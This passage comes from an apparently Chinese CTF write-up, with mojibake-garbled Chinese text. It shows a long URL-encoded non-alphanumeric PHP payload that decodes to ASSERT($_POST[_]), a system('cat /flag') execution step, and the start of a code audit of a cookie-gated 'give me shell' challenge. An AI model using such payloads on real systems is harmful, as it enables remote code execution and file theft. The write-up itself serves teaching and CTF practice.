operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>e<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>e<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>e<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>e<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token comment">//</span></code></pre><p>å› ä¸ºæºå¸¦è®¸å¤šä¸å¯æ‰“å°çš„å­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦ç»è¿‡urlç¼–ç åå‘åŒ…ä¼ å…¥ï¼Œä»¥ä¸Šä»£ç ç¿»è¯‘è¿‡æ¥å°±æ˜¯ï¼š<code>ASSERT($_POST[_]);</code>ï¼Œå³å¯<code>post</code>ä¸€ä¸ª<code>_</code>ï¼Œå­—ç¬¦æ‰§è¡Œä»£ç ï¼Œ<code>_=system(&#39;cat /flag&#39;);</code>ï¼Œå³å¯æ‹¿åˆ°<code>flag</code></p><h3 id="WEB-ç»™ä½ shell"><a href="#WEB-ç»™ä½ shell" class="headerlink" title="WEB_ç»™ä½ shell"></a>WEB_ç»™ä½ shell</h3><p>F12çœ‹åˆ°æºç ï¼Œä¸”æœ‰ä¸ªæç¤º<code>flag is in /flag.txt</code>ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//It's no need to use scanner. Of course if you want, but u will find nothing.</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'view_source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">checkCookie</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">':'</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'&#123;"secret"'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[\"0-9A-Z]*&#125;$/'</span><span class="token punctuation">,</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">2</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">theFirstTimeSetCookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">haveFun</span><span class="token punctuation">(</span><span class="token variable">$_f_g</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$_g_r</span> <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>    <span class="token variable">$_m_u</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_f_g</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$_h_p</span> <span class="token operator">=</span> <span class="token function">strtoupper</span><span class="token punctuation">(</span><span class="token variable">$_m_u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$_g_r</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$_i</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_h_p</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_i</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$_i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$_i</span> <span class="token operator">&amp;</span> <span class="token number">0xC0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">die</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&#123;"secret":"'</span> <span class="token operator">.</span> <span class="token function">strtoupper</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'y1ng'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"&#125;'</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">7200</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">checkCookie</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$obj</span> <span class="token operator">=</span> @<span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'no'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$obj</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'give_me_shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$flag_md5</span> <span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">haveFun</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"here is your webshell: <span class="token interpolation"><span class="token variable">$shell_path</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">die</span><span class="token punctuation">;</span></span></code></pre><p>ä»£ç å®¡è®¡åå‘ç°æ˜¯éœ€è¦<code>get</code>ä¸€ä¸ª<code>give_me_shell</code>ï¼Œéšåæ‰å¯ä»¥è¿›å…¥å‡½æ•°ä¸­çš„ä¸‰ç›®è¿ç®—ç¬¦è¿›è¡Œä¿¡æ¯çš„è¯»å–ï¼Œä¸”éœ€è¦<code>$obj[&#39;secret&#39;] == $flag_md5(æ¨æµ‹ä¸º$flagçš„md5å€¼)</code>ï¼Œæ‰å¯ä»¥è¿›è¡Œ<code>echo &quot;here is your webshell: 